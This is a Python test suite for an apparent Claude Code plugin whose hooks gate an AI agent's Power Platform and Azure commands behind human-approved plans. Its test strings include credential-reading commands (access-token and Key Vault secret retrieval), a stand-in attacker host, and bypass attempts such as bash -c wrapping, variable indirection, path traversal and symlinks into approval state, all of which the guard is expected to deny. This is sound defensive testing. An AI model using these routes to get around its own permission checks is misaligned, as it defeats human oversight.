"""Testy harnessu pp-support. Bez dostepu do chmury: HTTP jest podmieniony.

Uruchomienie:  python3 tests/test_harness.py
"""
from __future__ import annotations

import io
import json
import os
import shlex
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SCRIPTS = ROOT / "scripts"
TMP = Path(tempfile.mkdtemp(prefix="pp-support-test-"))
os.environ["PP_SUPPORT_STATE_DIR"] = str(TMP / "state")
os.environ["CLAUDE_PLUGIN_ROOT"] = str(ROOT)
WORK = TMP / "work"
WORK.mkdir()
PPCALL = str(SCRIPTS / "ppcall")
Q = shlex.quote(PPCALL)  # tak jak wpisze to model: sciezka w cudzyslowie
WIN = PPCALL.replace("/", "\\")  # zapis z backslashami, jak w PowerShell na Windows
# subprocess na Windows szuka "bash" najpierw w System32 (WSL), dlatego jawna sciezka
BASH = os.environ.get("PP_TEST_BASH") or shutil.which("bash") or "bash"
DV = "https://ekovoltis-test.crm4.dynamics.com"
FAILS: list[str] = []


def hook(name: str, payload: dict) -> dict | None:
    r = subprocess.run([BASH, str(SCRIPTS / "run-py"), name], input=json.dumps(payload),
                       capture_output=True, text=True, encoding="utf-8", errors="replace", env=os.environ)
    assert r.returncode in (0, 2), r.stderr
    return json.loads(r.stdout) if r.stdout.strip() else None


def decision(cmd: str, tool: str = "Bash") -> str | None:
    key = "command" if tool in ("Bash", "PowerShell") else "file_path"
    out = hook("hook_guard", {"tool_name": tool, "tool_input": {key: cmd}, "cwd": str(WORK)})
    return out["hookSpecificOutput"]["permissionDecision"] if out else None


def expect(label: str, got, want) -> None:
    ok = got == want
    print(f"  {'OK ' if ok else 'ZLE'} {label}: {got}" + ("" if ok else f" (oczekiwano {want})"))
    if not ok:
        FAILS.append(label)


def ppcall(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run([BASH, PPCALL, *args], cwd=WORK, capture_output=True, text=True, encoding="utf-8", errors="replace", env=os.environ)


def prompt(text: str) -> dict | None:
    return hook("hook_prompt", {"prompt": text, "cwd": str(WORK)})


print("1. Straznik: odczyt i blokady")
expect("ppcall get", decision(f'{Q} get "{DV}/api/data/v9.2/WhoAmI"'), "allow")
expect("ppcall get z & w cudzyslowie", decision(f'{Q} get "{DV}/api/data/v9.2/x?$top=5&$select=name"'), "allow")
expect("ppcall get | head", decision(f'{Q} get "{DV}/api/data/v9.2/WhoAmI" | head -5'), None)
expect("podrobiony ppcall", decision(f'./scripts/ppcall get "{DV}/api/data/v9.2/WhoAmI"'), "deny")
expect("curl do Dataverse", decision(f'curl -H "Authorization: x" {DV}/api/data/v9.2/accounts'), "deny")
expect("python z hostem", decision('python -c "import requests; requests.get(\'https://graph.microsoft.com/v1.0/me\')"'), "deny")
expect("az get-access-token", decision("az account get-access-token --resource https://x"), "deny")
expect("az rest", decision("az rest --method get --url https://example.org"), "deny")
expect("az list", decision("az resource list -g rg-automaty -o table"), "allow")
expect("az secret list", decision("az keyvault secret list --vault-name v"), "allow")
expect("az logicapp show", decision("az logic workflow show -g rg -n wf"), "allow")
expect("az webapp restart", decision("az webapp restart -n x -g y"), "deny")
expect("az keyvault secret show", decision("az keyvault secret show --vault-name v -n s"), "deny")
expect("pac solution list", decision("pac solution list"), "allow")
expect("pac solution import", decision("pac solution import --path x.zip"), "deny")
expect("pac org who", decision("pac.exe org who"), "allow")
expect("PowerShell Set-AdminFlow", decision("Set-AdminFlowOwnerRole -EnvironmentName x", "PowerShell"), "deny")
expect("Invoke-RestMethod", decision("Invoke-RestMethod https://api.flow.microsoft.com/x", "PowerShell"), "deny")
expect("dostep do stanu", decision("cat ~/.claude/pp-support-state/akceptacje/INC-1.json"), "deny")
expect("zwykle ls", decision("ls -la"), None)
expect("zapis do stanu", decision(str(Path.home() / ".claude/pp-support-state/akceptacje/INC-1.json"), "Write"), "deny")
expect("zapis do pluginu", decision(str(SCRIPTS / "common.py"), "Edit"), "deny")
expect("zapis do planu", decision(str(WORK / "zgloszenia/INC-1/plan.md"), "Write"), None)
mcp = hook("hook_guard", {"tool_name": "mcp__dataverse__update_record", "tool_input": {}, "cwd": str(WORK)})
expect("MCP Dataverse update", mcp["hookSpecificOutput"]["permissionDecision"] if mcp else None, "deny")
mcp = hook("hook_guard", {"tool_name": "mcp__dataverse__read_query", "tool_input": {}, "cwd": str(WORK)})
expect("MCP Dataverse read", mcp, None)
mcp = hook("hook_guard", {"tool_name": "mcp__Atlassian__createJiraIssue", "tool_input": {}, "cwd": str(WORK)})
expect("MCP Atlassian (poza zakresem)", mcp, None)

print("2. Plan i walidacja")
expect("plan-new", ppcall("plan-new", "INC-1").returncode, 0)
expect("pusty szablon nie przechodzi", ppcall("plan-check", "INC-1").returncode, 2)
expect("exec bez planu gotowego", decision(f"{Q} exec INC-1 1"), "deny")

PLAN = f"""# Plan naprawy: zgłoszenie INC-1

## Automatyzacja
007 AKDW, Automatyczne komunikaty do wytwórców, produkcja, developer Bus Przemysław.

## Objaw
Wytwórcy nie dostali wczoraj komunikatów SMS o cenach poniżej limitu, zgłosił Trading.

## Przyczyna
Flow został automatycznie wyłączony przez platformę po 14 dniach błędów połączenia z bramką SMS.

## Dowody
FAKT: flowruns pokazuje 14 nieudanych przebiegów z błędem 401 od 2026-10-01, stan flow Suspended.

## Proponowana naprawa
Połączenie zostało już odnowione przez człowieka, włączamy flow ponownie i sprawdzamy następny przebieg.

## Ryzyko i wpływ
Po włączeniu flow wyśle komunikaty tylko dla jutrzejszych cen, zaległych nie nadrobi automatycznie.

## Plan wycofania
Wyłączenie flow tym samym API (turnOff), stan wraca do obecnego bez utraty danych.

## Weryfikacja po naprawie
Odczyt stanu flow zwraca Started, a najbliższy przebieg o 14:00 kończy się statusem Succeeded.

## Kroki
```json
[
  {{"nr": 1, "opis": "Włączenie flow AKDW", "typ": "http", "metoda": "POST",
   "url": "https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/env1/flows/abc/start?api-version=2016-11-01"}}
]
```
"""
plan_file = WORK / "zgloszenia/INC-1/plan.md"
plan_file.write_text(PLAN, encoding="utf-8")
r = ppcall("plan-check", "INC-1")
expect("poprawny plan", r.returncode, 0)
h = [l for l in r.stdout.splitlines() if "Skrot planu" in l][0].split()[-1]

bad = PLAN.replace('"metoda": "POST"', '"metoda": "DELETE"')
plan_file.write_text(bad, encoding="utf-8")
expect("DELETE odrzucony", ppcall("plan-check", "INC-1").returncode, 2)
bad = PLAN.replace("https://api.flow.microsoft.com", "https://evil.example.com")
plan_file.write_text(bad, encoding="utf-8")
expect("obcy host odrzucony", ppcall("plan-check", "INC-1").returncode, 2)
bad = PLAN.replace('"typ": "http", "metoda": "POST",\n   "url": "https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/env1/flows/abc/start?api-version=2016-11-01"',
                  '"typ": "cli", "argv": ["pac", "solution", "delete", "--solution-name", "x"]')
plan_file.write_text(bad, encoding="utf-8")
expect("pac delete odrzucony", ppcall("plan-check", "INC-1").returncode, 2)
plan_file.write_text(PLAN, encoding="utf-8")

print("3. Akceptacja")
expect("exec bez akceptacji", decision(f"{Q} exec INC-1 1"), "deny")
expect("ppcall exec bez akceptacji (sam skrypt)", ppcall("exec", "INC-1", "1").returncode, 3)
own_cause = "Platforma sama zawiesiła flow, bo przez dwa tygodnie bramka SMS odrzucała logowanie."
own_fix = "Skoro połączenie już działa, tylko włączamy flow z powrotem, nic więcej nie ruszamy."
r = prompt(f"AKCEPTUJĘ INC-1 deadbeef00\nPrzyczyna: {own_cause}\nNaprawa: {own_fix}")
expect("zly skrot", r and r.get("decision"), "block")
r = prompt(f"AKCEPTUJĘ INC-1 {h}\nPrzyczyna: flow nie dziala\nNaprawa: wlaczyc")
expect("za krotkie uzasadnienie", r and r.get("decision"), "block")
r = prompt(f"AKCEPTUJĘ INC-1 {h}\nPrzyczyna: Flow został automatycznie wyłączony przez platformę po 14 dniach błędów połączenia\nNaprawa: {own_fix}")
expect("przepisane z planu", r and r.get("decision"), "block")
r = prompt("Pomóż mi z flow AKDW, nie działa")
expect("zwykla wiadomosc bez wplywu", r, None)
r = prompt(f"AKCEPTUJE INC-1 {h}\nPrzyczyna: {own_cause}\nNaprawa: {own_fix}")
expect("poprawna akceptacja (bez polskich znakow)", "additionalContext" in json.dumps(r or {}), True)
expect("exec po akceptacji -> pytanie", decision(f"{Q} exec INC-1 1"), "ask")
expect("exec z PowerShell (backslashe) -> pytanie", decision(f'bash "{WIN}" exec INC-1 1', "PowerShell"), "ask")
expect("exec przez /usr/bin/bash -> pytanie", decision(f"/usr/bin/bash {Q} exec INC-1 1"), "ask")
expect("exec laczony z innym poleceniem", decision(f"{Q} exec INC-1 1 && echo ok"), "deny")
expect("exec kroku 2 (nie istnieje)", decision(f"{Q} exec INC-1 2"), "deny")

print("4. Zmiana planu po akceptacji")
plan_file.write_text(PLAN.replace("14:00", "15:00"), encoding="utf-8")
expect("exec po zmianie planu", decision(f"{Q} exec INC-1 1"), "deny")
expect("exec z PowerShell po zmianie planu", decision(f'bash "{WIN}" exec INC-1 1', "PowerShell"), "deny")
plan_file.write_text(PLAN, encoding="utf-8")
expect("exec po przywroceniu planu", decision(f"{Q} exec INC-1 1"), "ask")

print("5. Wykonanie (HTTP podmieniony)")
sys.path.insert(0, str(SCRIPTS))
import ppcall as P  # noqa: E402
calls = []
P.http = lambda m, u, b=None, timeout=90, headers=None: (calls.append((m, u)) or (200, b'{"ok":true}'))
os.chdir(WORK)
try:
    P.cmd_exec(["INC-1", "1"])
except SystemExit as e:
    expect("exec zakonczony", e.code, None)
expect("wyslane zadanie", calls[0][0] if calls else None, "POST")
expect("ponowny exec tego samego kroku", decision(f"{Q} exec INC-1 1"), "deny")
log = (WORK / "zgloszenia/INC-1/wykonanie.jsonl").read_text(encoding="utf-8")
expect("dziennik wykonania", '"sukces": true' in log, True)

print("6. Odwolanie")
r = prompt("ODWOŁUJĘ INC-1")
expect("odwolanie", "odwolal" in json.dumps(r or {}, ensure_ascii=False), True)
expect("brak akceptacji po odwolaniu", (TMP / "state/akceptacje/INC-1.json").exists(), False)

print("7. Brak Pythona -> blokada")
env = {"PATH": "/nonexistent", "HOME": str(Path.home())}
if os.environ.get("SYSTEMROOT"):
    env["SYSTEMROOT"] = os.environ["SYSTEMROOT"]
r = subprocess.run([BASH, str(SCRIPTS / "run-py"), "hook_guard"], input="{}", capture_output=True, text=True, encoding="utf-8", errors="replace", env=env)
expect("kod wyjscia przy braku Pythona", r.returncode, 2)

print("8. ppcall get --out")
stan = TMP / "state/akceptacje/INC-9.json"
stan.write_text('{"nie": "ruszac"}', encoding="utf-8")
get = f'{Q} get "{DV}/api/data/v9.2/WhoAmI" --out '
expect("--out w katalogu zgloszenia", decision(get + "zgloszenia/INC-1/odp.json"), "allow")
expect("--out w podkatalogu zgloszenia", decision(get + "zgloszenia/INC-1/dane/odp.json"), "allow")
for label, target in [
    ("--out plan.md", "zgloszenia/INC-1/plan.md"),
    ("--out PLAN.md. (Windows)", "zgloszenia/INC-1/PLAN.md."),
    ("--out wykonanie.jsonl", "zgloszenia/INC-1/wykonanie.jsonl"),
    ("--out stan akceptacji", shlex.quote(str(stan))),
    ("--out ~/.claude/pp-support-state", "~/.claude/pp-support-state/akceptacje/INC-9.json"),
    ("--out kod pluginu", shlex.quote(str(SCRIPTS / "common.py"))),
    ("--out .claude/settings.json", ".claude/settings.json"),
    ("--out .claude w zgloszeniu", "zgloszenia/INC-1/.claude/settings.json"),
    ("--out poza zgloszeniem", "odp.json"),
    ("--out ucieczka przez ..", "zgloszenia/INC-1/../../odp.json"),
    ("--out sam katalog zgloszenia", "zgloszenia/INC-1"),
    ("--out zly identyfikator", "zgloszenia/x/odp.json"),
    ("--out strumien NTFS", "zgloszenia/INC-1/odp.json:s"),
    ("--out podwojny, drugi zly", "zgloszenia/INC-1/a.json --out zgloszenia/INC-1/plan.md"),
]:
    expect(label, decision(get + target), "deny")
link = WORK / "zgloszenia/INC-1/link"
try:
    link.symlink_to(TMP / "state", target_is_directory=True)
except OSError:
    print("  -- dowiazanie symboliczne niedostepne (brak uprawnien), pominiete")
else:
    expect("--out przez dowiazanie do stanu", decision(get + "zgloszenia/INC-1/link/akceptacje/INC-9.json"), "deny")

calls.clear()
before = plan_file.read_text(encoding="utf-8")
for label, target in [("ppcall: --out plan.md", "zgloszenia/INC-1/plan.md"),
                      ("ppcall: --out stan akceptacji", str(stan)),
                      ("ppcall: --out kod pluginu", str(SCRIPTS / "common.py")),
                      ("ppcall: --out poza zgloszeniem", "../odp.json")]:
    try:
        P.cmd_get([f"{DV}/api/data/v9.2/WhoAmI", "--out", target])
        code = 0
    except SystemExit as e:
        code = e.code
    expect(label, code, 3)
expect("ppcall: brak zapytania HTTP przy odmowie", calls, [])
expect("ppcall: plan nienaruszony", plan_file.read_text(encoding="utf-8") == before, True)
expect("ppcall: stan nienaruszony", stan.read_text(encoding="utf-8"), '{"nie": "ruszac"}')
try:
    P.cmd_get([f"{DV}/api/data/v9.2/WhoAmI", "--out", "zgloszenia/INC-1/odp.json"])
except SystemExit as e:
    expect("ppcall: poprawny --out", e.code, None)
expect("ppcall: zapis do zgloszenia", (WORK / "zgloszenia/INC-1/odp.json").read_bytes(), b'{"ok":true}')

print("9. Rozpoznawanie ppcall (Windows, PowerShell, obejscia)")
import hook_guard as G  # noqa: E402
expect("PowerShell: backslash przed cudzyslowem nie jest ucieczka",
       G.split_segments('echo "a\\"; ls', "powershell"), ['echo "a\\"', " ls"])
expect("PowerShell: tokeny", G.tokenize(r'''bash "C:\a b\ppcall" `"x\ 'it''s' ''', "powershell"),
       ["bash", r"C:\a b\ppcall", '"x\\', "it's"])
expect("PowerShell get", decision(f'bash "{WIN}" get "{DV}/api/data/v9.2/WhoAmI"', "PowerShell"), "allow")
expect("PowerShell exec bez akceptacji", decision(f'bash "{WIN}" exec INC-1 1', "PowerShell"), "deny")
if " " not in WIN:
    expect("PowerShell: sciezka bez cudzyslowu", decision(f"bash {WIN} exec INC-1 1", "PowerShell"), "deny")
expect("PowerShell bash.exe",decision(f'bash.exe "{WIN}" exec INC-1 1', "PowerShell"), "deny")
expect("PowerShell: trik z \\\"", decision(f'echo "a\\"; bash "{WIN}" exec INC-1 1', "PowerShell"), "deny")
expect("Bash: sciezka z backslashami w apostrofach", decision(f"'{WIN}' exec INC-1 1"), "deny")
if len(PPCALL) > 2 and PPCALL[1] == ":":
    gitbash = "/" + PPCALL[0].lower() + PPCALL[2:].replace("\\", "/")
    expect("Bash: sciezka /c/... (Git Bash)", decision(f"{shlex.quote(gitbash)} status INC-1"), "allow")
expect("bash -c z ppcall", decision(f'bash -c "{Q} exec INC-1 1"'), "deny")
expect("python ppcall.py", decision(f"python {shlex.quote(str(SCRIPTS / 'ppcall.py'))} exec INC-1 1"), "deny")
expect("ppcall przez zmienna", decision(f"P={Q}; $P exec INC-1 1"), "deny")

print("10. Awaria hooka -> blokada (fail closed)")
broken = TMP / "zepsuty"
shutil.copytree(SCRIPTS, broken)
(broken / "common.py").write_text('raise RuntimeError("zepsuty import")\n', encoding="utf-8")


def broken_hook(name: str, payload: dict) -> int:
    return subprocess.run([BASH, str(broken / "run-py"), name], input=json.dumps(payload),
                          capture_output=True, text=True, encoding="utf-8", errors="replace", env=os.environ).returncode


expect("PreToolUse przy wyjatku importu", broken_hook("hook_guard", {"tool_name": "Bash", "tool_input": {"command": "ls"}}), 2)
expect("akceptacja przy awarii", broken_hook("hook_prompt", {"prompt": f"AKCEPTUJĘ INC-1 {h}"}), 2)
expect("odwolanie przy awarii", broken_hook("hook_prompt", {"prompt": "ODWOŁUJĘ INC-1"}), 2)
expect("zwykla wiadomosc przy awarii", broken_hook("hook_prompt", {"prompt": "Pomoz z flow"}), 0)

print("11. Kodowanie: UTF-8 niezaleznie od konsoli (Windows cp1252)")
cp1252 = {**os.environ, "PYTHONIOENCODING": "cp1252", "PYTHONUTF8": "0"}
r = subprocess.run([BASH, PPCALL, "plan-check", "INC-1"], cwd=WORK, capture_output=True, text=True,
                   encoding="utf-8", errors="replace", env=cp1252)
expect("ppcall plan-check przy cp1252", r.returncode, 0)
expect("ppcall: polskie znaki na wyjsciu", "AKCEPTUJĘ INC-1" in r.stdout, True)
r = subprocess.run([BASH, str(SCRIPTS / "run-py"), "hook_prompt"], capture_output=True, text=True,
                   encoding="utf-8", errors="replace", env=cp1252,
                   input=json.dumps({"prompt": "ODWOŁUJĘ INC-7", "cwd": str(WORK)}, ensure_ascii=False))
expect("hook_prompt przy cp1252: kod", r.returncode, 0)
expect("hook_prompt przy cp1252: odwolanie z polskimi znakami rozpoznane",
       "INC-7" in json.dumps(json.loads(r.stdout or "{}"), ensure_ascii=False), True)

print("12. Ustawienia pluginu: konwersja sciezek Git Bash i walidacja")
import common as C  # noqa: E402
expect("site_path: wartosc znieksztalcona przez Git Bash",
       C.site_path("C:/Users/x/AppData/Local/Programs/Git/sites/Synthos-Ekovoltis"), "/sites/Synthos-Ekovoltis")
expect("site_path: /teams/ z backslashami", C.site_path("C:\\Program Files\\Git\\teams\\Zespol\\"), "/teams/Zespol")
expect("site_path: poprawna wartosc bez zmian", C.site_path("/sites/Synthos-Ekovoltis"), "/sites/Synthos-Ekovoltis")
expect("site_path: pusta", C.site_path(""), "")
ok_cfg = {**C.DEFAULT_CONFIG, "dataverse_urls": ["https://ekovoltis.crm4.dynamics.com"],
          "sharepoint_site": "/sites/Synthos-Ekovoltis"}
expect("config_problems: poprawne ustawienia", C.config_problems(ok_cfg), [])
expect("config_problems: witryna bez /", len(C.config_problems({**ok_cfg, "sharepoint_site": "sites/X"})), 1)
expect("config_problems: Dataverse po http",
       len(C.config_problems({**ok_cfg, "dataverse_urls": ["http://ekovoltis.crm4.dynamics.com"]})), 1)
expect("config_problems: obcy host SharePoint",
       len(C.config_problems({**ok_cfg, "sharepoint_host": "evil.example.com"})), 1)
opt = {**os.environ, "CLAUDE_PLUGIN_OPTION_SHAREPOINT_SITE": "/sites/Synthos-Ekovoltis",
       "CLAUDE_PLUGIN_OPTION_DATAVERSE_URLS": "https://ekovoltis.crm4.dynamics.com"}
r = subprocess.run([BASH, str(SCRIPTS / "run-py"), "hook_session_start"], input="{}", capture_output=True,
                   text=True, encoding="utf-8", errors="replace", env=opt)
expect("SessionStart przez run-py: kod", r.returncode, 0)
expect("SessionStart przez run-py: witryna dociera bez zmian (Git Bash)",
       json.loads((TMP / "state/config.json").read_text(encoding="utf-8"))["sharepoint_site"], "/sites/Synthos-Ekovoltis")
expect("SessionStart: brak bledu ustawien", "Blad ustawien" in r.stdout, False)
r = subprocess.run([BASH, str(SCRIPTS / "run-py"), "hook_session_start"], input="{}", capture_output=True,
                   text=True, encoding="utf-8", errors="replace",
                   env={**opt, "CLAUDE_PLUGIN_OPTION_DATAVERSE_URLS": "http://zly.example.com"})
expect("SessionStart: blad ustawien zgloszony", "Blad ustawien pluginu: dataverse_urls" in r.stdout, True)

print("13. Krok flow-patch (Dataverse podmieniony)")
import contextlib  # noqa: E402
import copy  # noqa: E402
import stat as _stat  # noqa: E402

WF = "074310f4-d3df-ef11-8eea-6045bddff7b7"
OLD = "@formatDateTime(outputs('Pobierz_Fakturę')?['body/eko_originalinvoice/eko_issuedate'], 'yyyy.MM.dd')"
NEW = "@formatDateTime(outputs('Korygowane_2')?['body/eko_issuedate'], 'yyyy.MM.dd')"
ACTION = ["properties", "definition", "actions", "Switch", "cases", "Sprzedaż-1", "actions", "Switch_2",
          "cases", "Case", "actions", "Condition_7", "else", "actions", "Populate_a_Microsoft_Word_template_4"]
P1 = ACTION + ["inputs", "parameters", "dynamicFileSchema/755787681"]
P2 = ACTION + ["inputs", "parameters", "dynamicFileSchema/1202989038"]
DEFINITION = {"properties": {"connectionReferences": {"shared_wordonlinebusiness": {"connection": {"id": "c1"}}},
                             "definition": {"triggers": {"manual": {"type": "Request"}}, "actions": {
    "Switch": {"type": "Switch", "expression": "@x", "cases": {"Sprzedaż-1": {"case": "S1", "actions": {
        "Switch_2": {"type": "Switch", "cases": {"Case": {"actions": {
            "Condition_7": {"type": "If", "expression": {"equals": [1, 1]}, "actions": {}, "else": {"actions": {
                "Populate_a_Microsoft_Word_template_4": {
                    "type": "OpenApiConnection", "runAfter": {},
                    "inputs": {"host": {"connectionName": "shared_wordonlinebusiness"},
                               "parameters": {"dynamicFileSchema/755787681": OLD,
                                              "dynamicFileSchema/1202989038": OLD,
                                              "source": "groups/x"}}}}}}}}}}}}}}}}}}


class FakeDataverse:
    def __init__(self):
        self.reset()

    def reset(self, managed=False):
        self.clientdata = json.dumps(DEFINITION, ensure_ascii=False)
        self.version, self.modifiedon, self.managed = 100, "2026-08-25T09:52:49Z", managed
        self.patches, self.extra_change = [], False

    def record(self):
        return {"@odata.etag": f'W/"{self.version}"', "name": "[MAIN] 6. Invoicing - create PDF document",
                "clientdata": self.clientdata, "modifiedon": self.modifiedon, "statecode": 1, "statuscode": 2,
                "ismanaged": self.managed, "category": 5}

    def __call__(self, method, url, body=None, timeout=90, headers=None):
        if f"workflows({WF})" not in url:
            return 404, b"{}"
        if method == "GET":
            return 200, json.dumps(self.record(), ensure_ascii=False).encode("utf-8")
        if method == "PATCH":
            self.patches.append({"if_match": (headers or {}).get("If-Match"), "body": body})
            if (headers or {}).get("If-Match") != f'W/"{self.version}"':
                return 412, b'{"error": "precondition"}'
            data = json.loads(body["clientdata"])
            if self.extra_change:  # symulacja: zapis zmienia tez cos poza zadeklarowanymi sciezkami
                data["properties"]["definition"]["triggers"]["manual"]["type"] = "Recurrence"
                self.extra_change = False
            self.clientdata = json.dumps(data, ensure_ascii=False)
            self.version += 1
            self.modifiedon = f"2026-11-03T10:00:{self.version % 60:02d}Z"
            return 204, b""
        return 405, b"{}"


FAKE = FakeDataverse()
P.http = FAKE
cfg = C.load_config()
cfg["flow_patch_dataverse_urls"] = []
C.save_config(cfg)


def fp_plan(changes, modifiedon="2026-08-25T09:52:49Z", env=DV, sections=True) -> str:
    step = {"nr": 1, "opis": "Data faktury korygowanej w polu „z dnia” korekty", "typ": "flow-patch",
            "srodowisko": env, "workflowid": WF, "oczekiwany_modifiedon": modifiedon, "zmiany": changes}
    extra = ("## Analiza wpływu\nZmienia 54 korekty korekt, 332 pojedyncze korekty dają identyczny wynik.\n\n"
             "## Test\nTest na kopii flow w ekovoltis-test, dwie zmiany w diffie, PDF z poprawną datą.\n\n"
             if sections else "")
    return (PLAN.split("## Kroki")[0].replace("INC-1", "FP-1").replace("## Plan wycofania", extra + "## Plan wycofania")
            + "## Kroki\n```json\n" + json.dumps([step], ensure_ascii=False, indent=1) + "\n```\n")


CHANGES = [{"sciezka": P1, "bylo": OLD, "ma_byc": NEW}, {"sciezka": P2, "bylo": OLD, "ma_byc": NEW}]


def plan_check(text: str, incident: str = "FP-1") -> tuple[int | None, str]:
    d = WORK / "zgloszenia" / incident
    d.mkdir(parents=True, exist_ok=True)
    (d / "plan.md").write_text(text, encoding="utf-8")
    buf = io.StringIO()
    code = None
    with contextlib.redirect_stdout(buf):
        try:
            P.cmd_plan_check([incident])
        except SystemExit as e:
            code = e.code
    return code, buf.getvalue()


code, txt = plan_check(fp_plan(CHANGES))
expect("flow-patch wylaczony bez ustawienia", (code, "nie jest wlaczony" in txt), (2, True))
cfg["flow_patch_dataverse_urls"] = [DV]
C.save_config(cfg)
code, txt = plan_check(fp_plan(CHANGES))
expect("flow-patch: plan-check przechodzi", code, None)
expect("flow-patch: diff z dwiema zmianami", txt.count("ma byc:"), 2)
expect("flow-patch: krok wycofania wypisany", '"bylo": "' + NEW.replace('"', '\\"') in txt, True)
expect("flow-patch: polskie znaki w sciezce bez strat", "Sprzedaż-1" in txt, True)
expect("flow-patch: plan-check niczego nie zapisuje", FAKE.patches, [])
expect("flow-patch: bez sekcji Analiza wpływu i Test", plan_check(fp_plan(CHANGES, sections=False))[0], 2)
code, txt = plan_check(fp_plan([{**CHANGES[0], "bylo": OLD + " "}]))
expect("flow-patch: 'bylo' niezgodne z definicja", (code, "rozni sie od 'bylo'" in txt), (2, True))
code, txt = plan_check(fp_plan(CHANGES, modifiedon="2026-08-01T00:00:00Z"))
expect("flow-patch: inne modifiedon w plan-check", (code, "zmienil sie" in txt), (2, True))
for label, path in [
    ("runAfter", ACTION + ["runAfter", "x"]),
    ("type akcji", ACTION + ["type"]),
    ("wyzwalacz", ["properties", "definition", "triggers", "manual", "inputs", "schema"]),
    ("expression warunku", ["properties", "definition", "actions", "Switch", "cases", "Sprzedaż-1", "actions",
                            "Switch_2", "cases", "Case", "actions", "Condition_7", "expression"]),
    ("connectionReferences", ["properties", "connectionReferences", "shared_wordonlinebusiness", "connection", "id"]),
    ("host polaczenia", ACTION + ["inputs", "host", "connectionName"]),
    ("uri", ACTION + ["inputs", "uri"]),
    ("cale inputs", ACTION + ["inputs"]),
    ("cale parameters", ACTION + ["inputs", "parameters"]),
    ("pathTemplate", ACTION + ["inputs", "pathTemplate", "template"]),
    ("function", ACTION + ["inputs", "function", "id"]),
    ("klucz poza parameters i body", ACTION + ["inputs", "retryPolicy", "count"]),
    ("connectionName w parameters", ACTION + ["inputs", "parameters", "connectionName"]),
    ("sciezka tekstem", "properties.definition.actions.X.inputs.a"),
]:
    expect(f"flow-patch: {label} odrzucone", plan_check(fp_plan([{"sciezka": path, "bylo": "a", "ma_byc": "b"}]))[0], 2)
expect("flow-patch: wiecej niz 5 zmian",
       plan_check(fp_plan([{"sciezka": ACTION + ["inputs", "parameters", f"k{i}"], "bylo": "a", "ma_byc": "b"}
                           for i in range(6)]))[0], 2)
expect("flow-patch: GUID z nowa linia",
       plan_check(fp_plan(CHANGES).replace(WF, WF + "\\n", 1).replace(f"workflows({WF}\\n", f"workflows({WF}"))[0], 2)
expect("flow-patch: etykieta wedlug akcji, nie zagniezdzonego inputs",
       C.flow_patch_label(ACTION + ["inputs", "body", "inputs", "x"]),
       "Populate_a_Microsoft_Word_template_4: body/inputs/x")
expect("flow-patch: srodowisko spoza listy",
       plan_check(fp_plan(CHANGES, env="https://ekovoltis.crm4.dynamics.com"))[0], 2)
FAKE.reset(managed=True)
code, txt = plan_check(fp_plan(CHANGES))
expect("flow-patch: flow zarzadzany", (code, "zarzadzanym" in txt), (2, True))
FAKE.reset()


def accept(incident: str, text: str) -> None:
    hh = C.plan_hash(text)
    r = prompt(f"AKCEPTUJĘ {incident} {hh}\nPrzyczyna: Szablon korekty brał datę z faktury pierwotnej zamiast z "
               f"faktury, którą korygujemy.\nNaprawa: W dwóch polach daty w akcji szablonu podmieniamy źródło na "
               f"fakturę korygowaną, nic więcej.")
    expect(f"akceptacja {incident}", "additionalContext" in json.dumps(r or {}), True)


def run_exec(incident: str) -> int | None:
    with contextlib.redirect_stdout(io.StringIO()):
        try:
            P.cmd_exec([incident, "1"])
        except SystemExit as e:
            return e.code
    return None


text = fp_plan(CHANGES)
plan_check(text)
accept("FP-1", text)
ask = hook("hook_guard", {"tool_name": "Bash", "tool_input": {"command": f"{Q} exec FP-1 1"}, "cwd": str(WORK)})
expect("flow-patch: exec -> pytanie", ask["hookSpecificOutput"]["permissionDecision"] if ask else None, "ask")
reason = (ask or {}).get("hookSpecificOutput", {}).get("permissionDecisionReason", "")
expect("flow-patch: pytanie mowi o kopii", "kopie" in reason, True)
expect("flow-patch: pytanie pokazuje wartosci", ("Korygowane_2" in reason, "Pobierz_Fakturę" in reason), (True, True))
FAKE.modifiedon = "2026-11-03T08:00:00Z"  # ktos zmienil flow po akceptacji
expect("flow-patch: zmiana flow po akceptacji -> odmowa", run_exec("FP-1"), 4)
expect("flow-patch: po odmowie nic nie zapisano", FAKE.patches, [])

FAKE.reset()
text = fp_plan(CHANGES).replace("Wyłączenie flow", "Wyłączenie  flow")  # nowy plan = nowa akceptacja
(WORK / "zgloszenia/FP-1/plan.md").write_text(text, encoding="utf-8")
C.revoke_approval("FP-1")
accept("FP-1", text)
expect("flow-patch: exec", run_exec("FP-1"), None)
expect("flow-patch: If-Match z etagiem", FAKE.patches[0]["if_match"] if FAKE.patches else None, 'W/"100"')
after = json.loads(FAKE.clientdata)
expect("flow-patch: diff po zapisie = 2 sciezki", sorted(C.leaf_diff(DEFINITION, after)), sorted([tuple(P1), tuple(P2)]))
expect("flow-patch: nowa wartosc", C.get_at(after, P1), NEW)
backups = list(C.backup_dir("FP-1").glob(f"{WF}-*.json"))
expect("flow-patch: kopia zapisana w stanie", len(backups), 1)
expect("flow-patch: brak kopii w katalogu zgloszenia", (WORK / "zgloszenia/FP-1/backup").exists(), False)
expect("flow-patch: kopia = definicja sprzed zmiany",
       C.leaf_diff(DEFINITION, json.loads(backups[0].read_text(encoding="utf-8"))) if backups else None, [])
expect("flow-patch: kopia tylko do odczytu", bool(backups) and not os.stat(backups[0]).st_mode & _stat.S_IWRITE, True)
entry = json.loads((WORK / "zgloszenia/FP-1/wykonanie.jsonl").read_text(encoding="utf-8").splitlines()[-1])
expect("flow-patch: dziennik", (entry["sukces"], entry["modifiedon_przed"], bool(entry.get("modifiedon_po")),
                                len(entry.get("zmiany", []))), (True, "2026-08-25T09:52:49Z", True, 2))
expect("flow-patch: zapis do backup/ narzedziem Write", decision(str(backups[0]) if backups else "x", "Write"), "deny")
expect("flow-patch: --out do backup/", decision(f'{Q} get "{DV}/api/data/v9.2/WhoAmI" --out zgloszenia/FP-1/backup/x.json'), "deny")

print("   wycofanie: krok odwrotny w nowym planie")
rev = P.reverse_step({"opis": "x", "srodowisko": DV, "workflowid": WF, "zmiany": CHANGES})
rev["oczekiwany_modifiedon"] = entry["modifiedon_po"]
text = fp_plan(rev["zmiany"], modifiedon=entry["modifiedon_po"]).replace("FP-1", "FP-2")
code, _ = plan_check(text, "FP-2")
